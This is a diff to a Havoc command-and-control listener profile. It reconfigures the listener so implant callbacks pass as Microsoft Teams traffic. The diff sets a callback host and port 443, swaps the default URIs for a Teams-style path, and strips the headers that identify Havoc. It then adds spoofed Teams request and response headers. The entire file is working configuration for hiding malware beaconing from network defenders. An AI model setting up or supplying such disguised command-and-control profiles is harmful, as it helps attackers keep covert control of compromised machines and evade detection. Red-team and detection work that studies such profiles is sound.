@@ -21,35 +21,42 @@ Operators {
 
 Listeners {
     Http {
-        Name         = "Agent Listener - HTTP/s"
+        Name         = "teams profile - http"
         Hosts        = [
-            "192.168.0.148", # our callback host.
+            "5pider.net", # our callback host.
         ]
-        HostBind     = "192.168.0.148" # the address where the listener should bind to. 
+        HostBind     = "0.0.0.0" # the address where the listener should bind to. 
         HostRotation = "round-robin"
         PortBind     = 443
         PortConn     = 443
-        Secure       = true
+        Secure       = false # for now disabled so we can see the traffic content. (but alaways enabled this!!!)
         KillDate     = "2024-01-02 12:00:00"
         UserAgent    = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
 
         Uris = [
-            "/funny_cat.gif",
-            "/index.php",
-            "/test.txt",
-            "/helloworld.js"
+            "/Collector/2.0/settings/"
         ]
 
         Headers = [
-            "Content-type: text/plain",
-            "X-Havoc: true",
-            "X-Havoc-Agent: Demon",
+            "Accept: json",
+            "Referer: https://teams.microsoft.com/_",
+            "x-ms-session-id: f73c3186-057a-d996-3b63-b6e5de6ef20c",
+            "x-ms-client-type: desktop",
+            "x-mx-client-version: 27/1.0.0.2021020410",
+            "Accept-Encoding: gzip, deflate, br",
+            "Origin: https://teams.microsoft.com"
         ]
 
         Response {
             Headers = [
-                "Content-type: text/plain",
-                "X-IsHavocFramework: true",
+                "Content-Type: application/json; charset=utf-8",
+                "Server: Microsoft-HTTPAPI/2.0",
+                "X-Content-Type-Options: nosniff",
+                "x-ms-environment: North Europe-prod-3,_cnsVMSS-6_26",
+                "x-ms-latency: 40018.2038",
+                "Access-Control-Allow-Origin: https://teams.microsoft.com",
+                "Access-Control-Allow-Credentials: true",
+                "Connection: keep-alive"
             ]
         }
 
